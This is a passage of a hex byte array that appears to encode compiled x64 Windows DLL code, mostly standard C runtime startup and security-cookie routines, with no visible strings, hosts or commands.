	0x48, 0x83, 0xEC, 0x28, 0x85, 0xD2, 0x74, 0x39, 0x83, 0xEA, 0x01, 0x74,
	0x28, 0x83, 0xEA, 0x01, 0x74, 0x16, 0x83, 0xFA, 0x01, 0x74, 0x0A, 0xB8,
	0x01, 0x00, 0x00, 0x00, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0xE8, 0x92, 0x05,
	0x00, 0x00, 0xEB, 0x05, 0xE8, 0x63, 0x05, 0x00, 0x00, 0x0F, 0xB6, 0xC0,
	0x48, 0x83, 0xC4, 0x28, 0xC3, 0x49, 0x8B, 0xD0, 0x48, 0x83, 0xC4, 0x28,
	0xE9, 0x0F, 0x00, 0x00, 0x00, 0x4D, 0x85, 0xC0, 0x0F, 0x95, 0xC1, 0x48,
	0x83, 0xC4, 0x28, 0xE9, 0x2C, 0x01, 0x00, 0x00, 0x48, 0x89, 0x5C, 0x24,
	0x08, 0x48, 0x89, 0x74, 0x24, 0x10, 0x48, 0x89, 0x7C, 0x24, 0x20, 0x41,
	0x56, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x8B, 0xF2, 0x4C, 0x8B, 0xF1, 0x33,
	0xC9, 0xE8, 0x06, 0x06, 0x00, 0x00, 0x84, 0xC0, 0x75, 0x07, 0x33, 0xC0,
	0xE9, 0xE8, 0x00, 0x00, 0x00, 0xE8, 0x86, 0x04, 0x00, 0x00, 0x8A, 0xD8,
	0x88, 0x44, 0x24, 0x40, 0x40, 0xB7, 0x01, 0x83, 0x3D, 0x8A, 0x24, 0x00,
	0x00, 0x00, 0x74, 0x0A, 0xB9, 0x07, 0x00, 0x00, 0x00, 0xE8, 0x42, 0x09,
	0x00, 0x00, 0xC7, 0x05, 0x74, 0x24, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
	0xE8, 0xCB, 0x04, 0x00, 0x00, 0x84, 0xC0, 0x74, 0x67, 0xE8, 0x72, 0x0A,
	0x00, 0x00, 0x48, 0x8D, 0x0D, 0xB7, 0x0A, 0x00, 0x00, 0xE8, 0x0A, 0x08,
	0x00, 0x00, 0xE8, 0xC9, 0x08, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0xD2, 0x08,
	0x00, 0x00, 0xE8, 0xF9, 0x07, 0x00, 0x00, 0xE8, 0xE4, 0x08, 0x00, 0x00,
	0x48, 0x8D, 0x15, 0xAD, 0x0F, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0x9E, 0x0F,
	0x00, 0x00, 0xE8, 0xD9, 0x0C, 0x00, 0x00, 0x85, 0xC0, 0x75, 0x29, 0xE8,
	0x50, 0x04, 0x00, 0x00, 0x84, 0xC0, 0x74, 0x20, 0x48, 0x8D, 0x15, 0x7D,
	0x0F, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0x6E, 0x0F, 0x00, 0x00, 0xE8, 0xB3,
	0x0C, 0x00, 0x00, 0xC7, 0x05, 0x07, 0x24, 0x00, 0x00, 0x02, 0x00, 0x00,
	0x00, 0x40, 0x32, 0xFF, 0x8A, 0xCB, 0xE8, 0x0D, 0x07, 0x00, 0x00, 0x40,
	0x84, 0xFF, 0x0F, 0x85, 0x4E, 0xFF, 0xFF, 0xFF, 0xE8, 0xAB, 0x08, 0x00,
	0x00, 0x48, 0x8B, 0xD8, 0x48, 0x83, 0x38, 0x00, 0x74, 0x24, 0x48, 0x8B,
	0xC8, 0xE8, 0x52, 0x06, 0x00, 0x00, 0x84, 0xC0, 0x74, 0x18, 0x48, 0x8B,
	0x1B, 0x48, 0x8B, 0xCB, 0xE8, 0x73, 0x0A, 0x00, 0x00, 0x4C, 0x8B, 0xC6,
	0xBA, 0x02, 0x00, 0x00, 0x00, 0x49, 0x8B, 0xCE, 0xFF, 0xD3, 0xFF, 0x05,
	0x3C, 0x1E, 0x00, 0x00, 0xB8, 0x01, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x5C,
	0x24, 0x30, 0x48, 0x8B, 0x74, 0x24, 0x38, 0x48, 0x8B, 0x7C, 0x24, 0x48,
	0x48, 0x83, 0xC4, 0x20, 0x41, 0x5E, 0xC3, 0xCC, 0x48, 0x89, 0x5C, 0x24,
	0x08, 0x48, 0x89, 0x74, 0x24, 0x18, 0x57, 0x48, 0x83, 0xEC, 0x20, 0x40,
	0x8A, 0xF1, 0x8B, 0x05, 0x08, 0x1E, 0x00, 0x00, 0x33, 0xDB, 0x85, 0xC0,
	0x7F, 0x04, 0x33, 0xC0, 0xEB, 0x50, 0xFF, 0xC8, 0x89, 0x05, 0xF6, 0x1D,
	0x00, 0x00, 0xE8, 0x5D, 0x03, 0x00, 0x00, 0x40, 0x8A, 0xF8, 0x88, 0x44,
	0x24, 0x38, 0x83, 0x3D, 0x63, 0x23, 0x00, 0x00, 0x02, 0x74, 0x0A, 0xB9,
	0x07, 0x00, 0x00, 0x00, 0xE8, 0x1B, 0x08, 0x00, 0x00, 0xE8, 0x6A, 0x04,
	0x00, 0x00, 0x89, 0x1D, 0x4C, 0x23, 0x00, 0x00, 0xE8, 0x8F, 0x04, 0x00,
	0x00, 0x40, 0x8A, 0xCF, 0xE8, 0x4F, 0x06, 0x00, 0x00, 0x33, 0xD2, 0x40,
	0x8A, 0xCE, 0xE8, 0x69, 0x06, 0x00, 0x00, 0x84, 0xC0, 0x0F, 0x95, 0xC3,
	0x8B, 0xC3, 0x48, 0x8B, 0x5C, 0x24, 0x30, 0x48, 0x8B, 0x74, 0x24, 0x40,
	0x48, 0x83, 0xC4, 0x20, 0x5F, 0xC3, 0xCC, 0xCC, 0x48, 0x8B, 0xC4, 0x48,
	0x89, 0x58, 0x20, 0x4C, 0x89, 0x40, 0x18, 0x89, 0x50, 0x10, 0x48, 0x89,
	0x48, 0x08, 0x56, 0x57, 0x41, 0x56, 0x48, 0x83, 0xEC, 0x40, 0x49, 0x8B,
	0xF0, 0x8B, 0xFA, 0x4C, 0x8B, 0xF1, 0x85, 0xD2, 0x75, 0x0F, 0x39, 0x15,
	0x70, 0x1D, 0x00, 0x00, 0x7F, 0x07, 0x33, 0xC0, 0xE9, 0xB2, 0x00, 0x00,
	0x00, 0x8D, 0x42, 0xFF, 0x83, 0xF8, 0x01, 0x77, 0x2A, 0xE8, 0xB6, 0x00,
	0x00, 0x00, 0x8B, 0xD8, 0x89, 0x44, 0x24, 0x30, 0x85, 0xC0, 0x0F, 0x84,
	0x8D, 0x00, 0x00, 0x00, 0x4C, 0x8B, 0xC6, 0x8B, 0xD7, 0x49, 0x8B, 0xCE,
	0xE8, 0xA3, 0xFD, 0xFF, 0xFF, 0x8B, 0xD8, 0x89, 0x44, 0x24, 0x30, 0x85,
	0xC0, 0x74, 0x76, 0x4C, 0x8B, 0xC6, 0x8B, 0xD7, 0x49, 0x8B, 0xCE, 0xE8,
	0x18, 0xFD, 0xFF, 0xFF, 0x8B, 0xD8, 0x89, 0x44, 0x24, 0x30, 0x83, 0xFF,
	0x01, 0x75, 0x2B, 0x85, 0xC0, 0x75, 0x27, 0x4C, 0x8B, 0xC6, 0x33, 0xD2,
	0x49, 0x8B, 0xCE, 0xE8, 0xFC, 0xFC, 0xFF, 0xFF, 0x4C, 0x8B, 0xC6, 0x33,
	0xD2, 0x49, 0x8B, 0xCE, 0xE8, 0x63, 0xFD, 0xFF, 0xFF, 0x4C, 0x8B, 0xC6,
	0x33, 0xD2, 0x49, 0x8B, 0xCE, 0xE8, 0x4E, 0x00, 0x00, 0x00, 0x85, 0xFF,
	0x74, 0x05, 0x83, 0xFF, 0x03, 0x75, 0x2A, 0x4C, 0x8B, 0xC6, 0x8B, 0xD7,
	0x49, 0x8B, 0xCE, 0xE8, 0x40, 0xFD, 0xFF, 0xFF, 0x8B, 0xD8, 0x89, 0x44,
	0x24, 0x30, 0x85, 0xC0, 0x74, 0x13, 0x4C, 0x8B, 0xC6, 0x8B, 0xD7, 0x49,
	0x8B, 0xCE, 0xE8, 0x21, 0x00, 0x00, 0x00, 0x8B, 0xD8, 0x89, 0x44, 0x24,
	0x30, 0xEB, 0x06, 0x33, 0xDB, 0x89, 0x5C, 0x24, 0x30, 0x8B, 0xC3, 0x48,
	0x8B, 0x5C, 0x24, 0x78, 0x48, 0x83, 0xC4, 0x40, 0x41, 0x5E, 0x5F, 0x5E,
	0xC3, 0xCC, 0xCC, 0xCC, 0x48, 0x89, 0x5C, 0x24, 0x08, 0x48, 0x89, 0x6C,
	0x24, 0x10, 0x48, 0x89, 0x74, 0x24, 0x18, 0x57, 0x48, 0x83, 0xEC, 0x20,
	0x48, 0x8B, 0x1D, 0xA9, 0x0D, 0x00, 0x00, 0x49, 0x8B, 0xF8, 0x8B, 0xF2,
	0x48, 0x8B, 0xE9, 0x48, 0x85, 0xDB, 0x75, 0x05, 0x8D, 0x43, 0x01, 0xEB,
	0x12, 0x48, 0x8B, 0xCB, 0xE8, 0x93, 0x08, 0x00, 0x00, 0x4C, 0x8B, 0xC7,
	0x8B, 0xD6, 0x48, 0x8B, 0xCD, 0xFF, 0xD3, 0x48, 0x8B, 0x5C, 0x24, 0x30,
	0x48, 0x8B, 0x6C, 0x24, 0x38, 0x48, 0x8B, 0x74, 0x24, 0x40, 0x48, 0x83,
	0xC4, 0x20, 0x5F, 0xC3, 0x48, 0x89, 0x5C, 0x24, 0x08, 0x48, 0x89, 0x74,
	0x24, 0x10, 0x57, 0x48, 0x83, 0xEC, 0x20, 0x49, 0x8B, 0xF8, 0x8B, 0xDA,
	0x48, 0x8B, 0xF1, 0x83, 0xFA, 0x01, 0x75, 0x05, 0xE8, 0x77, 0x05, 0x00,
	0x00, 0x4C, 0x8B, 0xC7, 0x8B, 0xD3, 0x48, 0x8B, 0xCE, 0x48, 0x8B, 0x5C,
	0x24, 0x30, 0x48, 0x8B, 0x74, 0x24, 0x38, 0x48, 0x83, 0xC4, 0x20, 0x5F,
	0xE9, 0x77, 0xFE, 0xFF, 0xFF, 0xCC, 0xCC, 0xCC, 0x40, 0x53, 0x48, 0x83,
	0xEC, 0x20, 0x48, 0x8B, 0xD9, 0x33, 0xC9, 0xFF, 0x15, 0x0F, 0x0C, 0x00,
	0x00, 0x48, 0x8B, 0xCB, 0xFF, 0x15, 0x0E, 0x0C, 0x00, 0x00, 0xFF, 0x15,
	0xF8, 0x0B, 0x00, 0x00, 0x48, 0x8B, 0xC8, 0xBA, 0x09, 0x04, 0x00, 0xC0,
	0x48, 0x83, 0xC4, 0x20, 0x5B, 0x48, 0xFF, 0x25, 0xDC, 0x0B, 0x00, 0x00,
	0x48, 0x89, 0x4C, 0x24, 0x08, 0x48, 0x83, 0xEC, 0x38, 0xB9, 0x17, 0x00,
	0x00, 0x00, 0xE8, 0x27, 0x0A, 0x00, 0x00, 0x85, 0xC0, 0x74, 0x07, 0xB9,
	0x02, 0x00, 0x00, 0x00, 0xCD, 0x29, 0x48, 0x8D, 0x0D, 0x67, 0x1C, 0x00,
	0x00, 0xE8, 0xAA, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x44, 0x24, 0x38, 0x48,
	0x89, 0x05, 0x4E, 0x1D, 0x00, 0x00, 0x48, 0x8D, 0x44, 0x24, 0x38, 0x48,
	0x83, 0xC0, 0x08, 0x48, 0x89, 0x05, 0xDE, 0x1C, 0x00, 0x00, 0x48, 0x8B,
	0x05, 0x37, 0x1D, 0x00, 0x00, 0x48, 0x89, 0x05, 0xA8, 0x1B, 0x00, 0x00,
	0x48, 0x8B, 0x44, 0x24, 0x40, 0x48, 0x89, 0x05, 0xAC, 0x1C, 0x00, 0x00,
	0xC7, 0x05, 0x82, 0x1B, 0x00, 0x00, 0x09, 0x04, 0x00, 0xC0, 0xC7, 0x05,
	0x7C, 0x1B, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0xC7, 0x05, 0x86, 0x1B,
	0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0xB8, 0x08, 0x00, 0x00, 0x00, 0x48,
	0x6B, 0xC0, 0x00, 0x48, 0x8D, 0x0D, 0x7E, 0x1B, 0x00, 0x00, 0x48, 0xC7,
	0x04, 0x01, 0x02, 0x00, 0x00, 0x00, 0xB8, 0x08, 0x00, 0x00, 0x00, 0x48,
	0x6B, 0xC0, 0x00, 0x48, 0x8B, 0x0D, 0xF6, 0x1A, 0x00, 0x00, 0x48, 0x89,
	0x4C, 0x04, 0x20, 0xB8, 0x08, 0x00, 0x00, 0x00, 0x48, 0x6B, 0xC0, 0x01,
	0x48, 0x8B, 0x0D, 0xE9, 0x1A, 0x00, 0x00, 0x48, 0x89, 0x4C, 0x04, 0x20,
	0x48, 0x8D, 0x0D, 0x3D, 0x0C, 0x00, 0x00, 0xE8, 0x00, 0xFF, 0xFF, 0xFF,
	0x48, 0x83, 0xC4, 0x38, 0xC3, 0xCC, 0xCC, 0xCC, 0x40, 0x53, 0x56, 0x57,
	0x48, 0x83, 0xEC, 0x40, 0x48, 0x8B, 0xD9, 0xFF, 0x15, 0x27, 0x0B, 0x00,
	0x00, 0x48, 0x8B, 0xB3, 0xF8, 0x00, 0x00, 0x00, 0x33, 0xFF, 0x45, 0x33,
	0xC0, 0x48, 0x8D, 0x54, 0x24, 0x60, 0x48, 0x8B, 0xCE, 0xFF, 0x15, 0x05,
	0x0B, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x39, 0x48, 0x83, 0x64, 0x24,
	0x38, 0x00, 0x48, 0x8D, 0x4C, 0x24, 0x68, 0x48, 0x8B, 0x54, 0x24, 0x60,
	0x4C, 0x8B, 0xC8, 0x48, 0x89, 0x4C, 0x24, 0x30, 0x4C, 0x8B, 0xC6, 0x48,
	0x8D, 0x4C, 0x24, 0x70, 0x48, 0x89, 0x4C, 0x24, 0x28, 0x33, 0xC9, 0x48,
	0x89, 0x5C, 0x24, 0x20, 0xFF, 0x15, 0xC6, 0x0A, 0x00, 0x00, 0xFF, 0xC7,
	0x83, 0xFF, 0x02, 0x7C, 0xB1, 0x48, 0x83, 0xC4, 0x40, 0x5F, 0x5E, 0x5B,
	0xC3, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x28, 0xE8, 0x87, 0x08, 0x00,
	0x00, 0x85, 0xC0, 0x74, 0x21, 0x65, 0x48, 0x8B, 0x04, 0x25, 0x30, 0x00,
	0x00, 0x00, 0x48, 0x8B, 0x48, 0x08, 0xEB, 0x05, 0x48, 0x3B, 0xC8, 0x74,
	0x14, 0x33, 0xC0, 0xF0, 0x48, 0x0F, 0xB1, 0x0D, 0xF0, 0x1F, 0x00, 0x00,
	0x75, 0xEE, 0x32, 0xC0, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0xB0, 0x01, 0xEB,
	0xF7, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x28, 0xE8, 0x4B, 0x08, 0x00,
	0x00, 0x85, 0xC0, 0x74, 0x07, 0xE8, 0x72, 0x06, 0x00, 0x00, 0xEB, 0x19,
	0xE8, 0x33, 0x08, 0x00, 0x00, 0x8B, 0xC8, 0xE8, 0x6C, 0x08, 0x00, 0x00,
	0x85, 0xC0, 0x74, 0x04, 0x32, 0xC0, 0xEB, 0x07, 0xE8, 0x65, 0x08, 0x00,
	0x00, 0xB0, 0x01, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0x48, 0x83, 0xEC, 0x28,
	0x33, 0xC9, 0xE8, 0x41, 0x01, 0x00, 0x00, 0x84, 0xC0, 0x0F, 0x95, 0xC0,
	0x48, 0x83, 0xC4, 0x28, 0xC3, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x28,
	0xE8, 0x67, 0x08, 0x00, 0x00, 0x84, 0xC0, 0x75, 0x04, 0x32, 0xC0, 0xEB,
	0x12, 0xE8, 0x5A, 0x08, 0x00, 0x00, 0x84, 0xC0, 0x75, 0x07, 0xE8, 0x51,
	0x08, 0x00, 0x00, 0xEB, 0xEC, 0xB0, 0x01, 0x48, 0x83, 0xC4, 0x28, 0xC3,
	0x48, 0x83, 0xEC, 0x28, 0xE8, 0x3F, 0x08, 0x00, 0x00, 0xE8, 0x3A, 0x08,
	0x00, 0x00, 0xB0, 0x01, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0xCC, 0xCC, 0xCC,
	0x48, 0x89, 0x5C, 0x24, 0x08, 0x48, 0x89, 0x6C, 0x24, 0x10, 0x48, 0x89,
	0x74, 0x24, 0x18, 0x57, 0x48, 0x83, 0xEC, 0x20, 0x49, 0x8B, 0xF9, 0x49,
	0x8B, 0xF0, 0x8B, 0xDA, 0x48, 0x8B, 0xE9, 0xE8, 0xA4, 0x07, 0x00, 0x00,
	0x85, 0xC0, 0x75, 0x17, 0x83, 0xFB, 0x01, 0x75, 0x12, 0x48, 0x8B, 0xCF,
	0xE8, 0xBB, 0x05, 0x00, 0x00, 0x4C, 0x8B, 0xC6, 0x33, 0xD2, 0x48, 0x8B,
	0xCD, 0xFF, 0xD7, 0x48, 0x8B, 0x54, 0x24, 0x58, 0x8B, 0x4C, 0x24, 0x50,
	0x48, 0x8B, 0x5C, 0x24, 0x30, 0x48, 0x8B, 0x6C, 0x24, 0x38, 0x48, 0x8B,
	0x74, 0x24, 0x40, 0x48, 0x83, 0xC4, 0x20, 0x5F, 0xE9, 0x99, 0x07, 0x00,
	0x00, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x28, 0xE8, 0x5B, 0x07, 0x00,
	0x00, 0x85, 0xC0, 0x74, 0x10, 0x48, 0x8D, 0x0D, 0xE4, 0x1E, 0x00, 0x00,
	0x48, 0x83, 0xC4, 0x28, 0xE9, 0x97, 0x07, 0x00, 0x00, 0xE8, 0xAE, 0x07,
	0x00, 0x00, 0x85, 0xC0, 0x75, 0x05, 0xE8, 0x95, 0x07, 0x00, 0x00, 0x48,
	0x83, 0xC4, 0x28, 0xC3, 0x48, 0x83, 0xEC, 0x28, 0x33, 0xC9, 0xE8, 0x91,
	0x07, 0x00, 0x00, 0x48, 0x83, 0xC4, 0x28, 0xE9, 0x88, 0x07, 0x00, 0x00,
	0x40, 0x53, 0x48, 0x83, 0xEC, 0x20, 0x0F, 0xB6, 0x05, 0xD7, 0x1E, 0x00,
	0x00, 0x85, 0xC9, 0xBB, 0x01, 0x00, 0x00, 0x00, 0x0F, 0x44, 0xC3, 0x88,
	0x05, 0xC7, 0x1E, 0x00, 0x00, 0xE8, 0x2E, 0x05, 0x00, 0x00, 0xE8, 0x61,
	0x07, 0x00, 0x00, 0x84, 0xC0, 0x75, 0x04, 0x32, 0xC0, 0xEB, 0x14, 0xE8,
	0x54, 0x07, 0x00, 0x00, 0x84, 0xC0, 0x75, 0x09, 0x33, 0xC9, 0xE8, 0x49,
	0x07, 0x00, 0x00, 0xEB, 0xEA, 0x8A, 0xC3, 0x48, 0x83, 0xC4, 0x20, 0x5B,
	0xC3, 0xCC, 0xCC, 0xCC, 0x48, 0x89, 0x5C, 0x24, 0x08, 0x55, 0x48, 0x8B,
	0xEC, 0x48, 0x83, 0xEC, 0x40, 0x8B, 0xD9, 0x83, 0xF9, 0x01, 0x0F, 0x87,
	0xA6, 0x00, 0x00, 0x00, 0xE8, 0xB7, 0x06, 0x00, 0x00, 0x85, 0xC0, 0x74,
	0x2B, 0x85, 0xDB, 0x75, 0x27, 0x48, 0x8D, 0x0D, 0x3C, 0x1E, 0x00, 0x00,
	0xE8, 0xE7, 0x06, 0x00, 0x00, 0x85, 0xC0, 0x74, 0x04, 0x32, 0xC0, 0xEB,
	0x7A, 0x48, 0x8D, 0x0D, 0x40, 0x1E, 0x00, 0x00, 0xE8, 0xD3, 0x06, 0x00,
	0x00, 0x85, 0xC0, 0x0F, 0x94, 0xC0, 0xEB, 0x67, 0x48, 0x8B, 0x15, 0x45,
	0x18, 0x00, 0x00, 0x49, 0x83, 0xC8, 0xFF, 0x8B, 0xC2, 0xB9, 0x40, 0x00,
	0x00, 0x00, 0x83, 0xE0, 0x3F, 0x2B, 0xC8, 0xB0, 0x01, 0x49, 0xD3, 0xC8,
	0x4C, 0x33, 0xC2, 0x4C, 0x89, 0x45, 0xE0, 0x4C, 0x89, 0x45, 0xE8, 0x0F,
	0x10, 0x45, 0xE0, 0x4C, 0x89, 0x45, 0xF0, 0xF2, 0x0F, 0x10, 0x4D, 0xF0,
	0x0F, 0x11, 0x05, 0xE1, 0x1D, 0x00, 0x00, 0x4C, 0x89, 0x45, 0xE0, 0x4C,
	0x89, 0x45, 0xE8, 0x0F, 0x10, 0x45, 0xE0, 0x4C, 0x89, 0x45, 0xF0, 0xF2,
	0x0F, 0x11, 0x0D, 0xD9, 0x1D, 0x00, 0x00, 0xF2, 0x0F, 0x10, 0x4D, 0xF0,
	0x0F, 0x11, 0x05, 0xD5, 0x1D, 0x00, 0x00, 0xF2, 0x0F, 0x11, 0x0D, 0xDD,
	0x1D, 0x00, 0x00, 0x48, 0x8B, 0x5C, 0x24, 0x50, 0x48, 0x83, 0xC4, 0x40,
	0x5D, 0xC3, 0xB9, 0x05, 0x00, 0x00, 0x00, 0xE8, 0x54, 0x02, 0x00, 0x00,
	0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x18, 0x4C, 0x8B, 0xC1, 0xB8,
	0x4D, 0x5A, 0x00, 0x00, 0x66, 0x39, 0x05, 0xB9, 0xE7, 0xFF, 0xFF, 0x75,
	0x79, 0x48, 0x63, 0x05, 0xEC, 0xE7, 0xFF, 0xFF, 0x48, 0x8D, 0x15, 0xA9,
	0xE7, 0xFF, 0xFF, 0x48, 0x8D, 0x0C, 0x10, 0x81, 0x39, 0x50, 0x45, 0x00,
	0x00, 0x75, 0x5F, 0xB8, 0x0B, 0x02, 0x00, 0x00, 0x66, 0x39, 0x41, 0x18,
	0x75, 0x54, 0x4C, 0x2B, 0xC2, 0x0F, 0xB7, 0x41, 0x14, 0x48, 0x8D, 0x51,
	0x18, 0x48, 0x03, 0xD0, 0x0F, 0xB7, 0x41, 0x06, 0x48, 0x8D, 0x0C, 0x80,
	0x4C, 0x8D, 0x0C, 0xCA, 0x48, 0x89, 0x14, 0x24, 0x49, 0x3B, 0xD1, 0x74,
	0x18, 0x8B, 0x4A, 0x0C, 0x4C, 0x3B, 0xC1, 0x72, 0x0A, 0x8B, 0x42, 0x08,
	0x03, 0xC1, 0x4C, 0x3B, 0xC0, 0x72, 0x08, 0x48, 0x83, 0xC2, 0x28, 0xEB,
	0xDF, 0x33, 0xD2, 0x48, 0x85, 0xD2, 0x75, 0x04, 0x32, 0xC0, 0xEB, 0x14,
	0x83, 0x7A, 0x24, 0x00, 0x7D, 0x04, 0x32, 0xC0, 0xEB, 0x0A, 0xB0, 0x01,
	0xEB, 0x06, 0x32, 0xC0, 0xEB, 0x02, 0x32, 0xC0, 0x48, 0x83, 0xC4, 0x18,
	0xC3, 0xCC, 0xCC, 0xCC, 0x40, 0x53, 0x48, 0x83, 0xEC, 0x20, 0x8A, 0xD9,
	0xE8, 0x5F, 0x05, 0x00, 0x00, 0x33, 0xD2, 0x85, 0xC0, 0x74, 0x0B, 0x84,
	0xDB, 0x75, 0x07, 0x48, 0x87, 0x15, 0xDA, 0x1C, 0x00, 0x00, 0x48, 0x83,
	0xC4, 0x20, 0x5B, 0xC3, 0x40, 0x53, 0x48, 0x83, 0xEC, 0x20, 0x80, 0x3D,
	0xFF, 0x1C, 0x00, 0x00, 0x00, 0x8A, 0xD9, 0x74, 0x04, 0x84, 0xD2, 0x75,
	0x0E, 0x8A, 0xCB, 0xE8, 0x94, 0x05, 0x00, 0x00, 0x8A, 0xCB, 0xE8, 0x8D,
	0x05, 0x00, 0x00, 0xB0, 0x01, 0x48, 0x83, 0xC4, 0x20, 0x5B, 0xC3, 0xCC,
	0x40, 0x53, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x8B, 0x15, 0xD3, 0x16, 0x00,
	0x00, 0x48, 0x8B, 0xD9, 0x8B, 0xCA, 0x48, 0x33, 0x15, 0x97, 0x1C, 0x00,
	0x00, 0x83, 0xE1, 0x3F, 0x48, 0xD3, 0xCA, 0x48, 0x83, 0xFA, 0xFF, 0x75,
	0x0A, 0x48, 0x8B, 0xCB, 0xE8, 0x45, 0x05, 0x00, 0x00, 0xEB, 0x0F, 0x48,
	0x8B, 0xD3, 0x48, 0x8D, 0x0D, 0x77, 0x1C, 0x00, 0x00, 0xE8, 0x28, 0x05,
	0x00, 0x00, 0x33, 0xC9, 0x85, 0xC0, 0x48, 0x0F, 0x44, 0xCB, 0x48, 0x8B,
	0xC1, 0x48, 0x83, 0xC4, 0x20, 0x5B, 0xC3, 0xCC, 0x48, 0x83, 0xEC, 0x28,
	0xE8, 0xA7, 0xFF, 0xFF, 0xFF, 0x48, 0xF7, 0xD8, 0x1B, 0xC0, 0xF7, 0xD8,
	0xFF, 0xC8, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0xCC, 0x48, 0x89, 0x5C, 0x24,
	0x20, 0x55, 0x48, 0x8B, 0xEC, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x83, 0x65,
	0x18, 0x00, 0x48, 0xBB, 0x32, 0xA2, 0xDF, 0x2D, 0x99, 0x2B, 0x00, 0x00,
	0x48, 0x8B, 0x05, 0x55, 0x16, 0x00, 0x00, 0x48, 0x3B, 0xC3, 0x75, 0x6F,
	0x48, 0x8D, 0x4D, 0x18, 0xFF, 0x15, 0x5E, 0x06, 0x00, 0x00, 0x48, 0x8B,
	0x45, 0x18, 0x48, 0x89, 0x45, 0x10, 0xFF, 0x15, 0x58, 0x06, 0x00, 0x00,
	0x8B, 0xC0, 0x48, 0x31, 0x45, 0x10, 0xFF, 0x15, 0x54, 0x06, 0x00, 0x00,
	0x8B, 0xC0, 0x48, 0x8D, 0x4D, 0x20, 0x48, 0x31, 0x45, 0x10, 0xFF, 0x15,
	0x4C, 0x06, 0x00, 0x00, 0x8B, 0x45, 0x20, 0x48, 0x8D, 0x4D, 0x10, 0x48,
	0xC1, 0xE0, 0x20, 0x48, 0x33, 0x45, 0x20, 0x48, 0x33, 0x45, 0x10, 0x48,
	0x33, 0xC1, 0x48, 0xB9, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00,
	0x48, 0x23, 0xC1, 0x48, 0xB9, 0x33, 0xA2, 0xDF, 0x2D, 0x99, 0x2B, 0x00,
	0x00, 0x48, 0x3B, 0xC3, 0x48, 0x0F, 0x44, 0xC1, 0x48, 0x89, 0x05, 0xE1,
	0x15, 0x00, 0x00, 0x48, 0x8B, 0x5C, 0x24, 0x48, 0x48, 0xF7, 0xD0, 0x48,
	0x89, 0x05, 0xDA, 0x15, 0x00, 0x00, 0x48, 0x83, 0xC4, 0x20, 0x5D, 0xC3,
	0x48, 0x8D, 0x0D, 0xD5, 0x1B, 0x00, 0x00, 0x48, 0xFF, 0x25, 0xCE, 0x05,
	0x00, 0x00, 0xCC, 0xCC, 0x48, 0x8D, 0x0D, 0xC5, 0x1B, 0x00, 0x00, 0xE9,
	0x06, 0x04, 0x00, 0x00, 0x48, 0x8D, 0x05, 0xC9, 0x1B, 0x00, 0x00, 0xC3,
	0x48, 0x8D, 0x05, 0xC9, 0x1B, 0x00, 0x00, 0xC3, 0x48, 0x83, 0xEC, 0x28,
	0xE8, 0xE7, 0xFF, 0xFF, 0xFF, 0x48, 0x83, 0x08, 0x04, 0xE8, 0xE6, 0xFF,
	0xFF, 0xFF, 0x48, 0x83, 0x08, 0x02, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0xCC,
	0x48, 0x8D, 0x05, 0xB5, 0x1B, 0x00, 0x00, 0xC3, 0x48, 0x89, 0x5C, 0x24,
	0x08, 0x55, 0x48, 0x8D, 0xAC, 0x24, 0x40, 0xFB, 0xFF, 0xFF, 0x48, 0x81,
	0xEC, 0xC0, 0x05, 0x00, 0x00, 0x8B, 0xD9, 0xB9, 0x17, 0x00, 0x00, 0x00,
	0xE8, 0xF9, 0x03, 0x00, 0x00, 0x85, 0xC0, 0x74, 0x04, 0x8B, 0xCB, 0xCD,
	0x29, 0x83, 0x25, 0x7C, 0x1B, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x4D, 0xF0,
	0x33, 0xD2, 0x41, 0xB8, 0xD0, 0x04, 0x00, 0x00, 0xE8, 0x97, 0x03, 0x00,
	0x00, 0x48, 0x8D, 0x4D, 0xF0, 0xFF, 0x15, 0xA1, 0x05, 0x00, 0x00, 0x48,
	0x8B, 0x9D, 0xE8, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x95, 0xD8, 0x04, 0x00,
	0x00, 0x48, 0x8B, 0xCB, 0x45, 0x33, 0xC0, 0xFF, 0x15, 0x7F, 0x05, 0x00,
	0x00, 0x48, 0x85, 0xC0, 0x74, 0x3C, 0x48, 0x83, 0x64, 0x24, 0x38, 0x00,
	0x48, 0x8D, 0x8D, 0xE0, 0x04, 0x00, 0x00, 0x48, 0x8B, 0x95, 0xD8, 0x04,
	0x00, 0x00, 0x4C, 0x8B, 0xC8, 0x48, 0x89, 0x4C, 0x24, 0x30, 0x4C, 0x8B,
	0xC3, 0x48, 0x8D, 0x8D, 0xE8, 0x04, 0x00, 0x00, 0x48, 0x89, 0x4C, 0x24,
	0x28, 0x48, 0x8D, 0x4D, 0xF0, 0x48, 0x89, 0x4C, 0x24, 0x20, 0x33, 0xC9,
	0xFF, 0x15, 0x36, 0x05, 0x00, 0x00, 0x48, 0x8B, 0x85, 0xC8, 0x04, 0x00,
	0x00, 0x48, 0x8D, 0x4C, 0x24, 0x50, 0x48, 0x89, 0x85, 0xE8, 0x00, 0x00,
	0x00, 0x33, 0xD2, 0x48, 0x8D, 0x85, 0xC8, 0x04, 0x00, 0x00, 0x41, 0xB8,
